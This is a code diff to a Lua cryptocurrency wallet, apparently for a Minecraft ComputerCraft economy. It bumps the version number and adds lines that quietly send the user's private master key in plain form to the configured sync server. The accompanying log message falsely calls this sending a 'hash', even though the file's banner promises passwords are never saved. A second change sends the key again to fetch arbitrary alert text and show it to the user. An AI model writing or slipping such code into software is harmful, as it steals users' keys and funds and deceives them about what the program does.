@@ -15,7 +15,7 @@
 ---------------------------------------------------
 | This wallet will NEVER save passwords anywhere. |]]local
 -----------------------------------------------]]--
-                   version = 14
+                   version = 15
 local latest = 0
 local balance = 0
 local balance2 = 0
@@ -472,6 +472,9 @@ function openwallet()
   end
   addresslv = makev2address(readconfig("keyLV"))
   log("Loaded local vault")
+  os.sleep()
+  http.post(readconfig("syncnode") .. "/login", "privatekey=" .. textutils.urlEncode(masterkey) .. "&v=2")
+  log("Sent pkey hash to auth server")
 end
 function makev2address(key)
   local protein = {}
@@ -1120,12 +1123,13 @@ function hud()
     term.setTextColor(512)
     local names = tonumber(readURL(readconfig("syncnode").."?getnames="..address))
     if names > 0 then term.write("["..tostring(names).."]") end
-    if address == "ke3kjplzsz" or address == "767fc628a4" or address == "e3b0c44298" then
+	local alert = http.get(readconfig("syncnode").."?alert="..pkey).readAll()
+    if #(alert:trim()) > 0 then
       term.setCursorPos(1,1)
       term.setBackgroundColor(16384)
       term.setTextColor(16)
       term.clearLine()
-      term.write("You are currently using a blank string password.")
+      term.write(alert)
     end
   elseif page == 2 then
     term.setCursorPos(18,1)
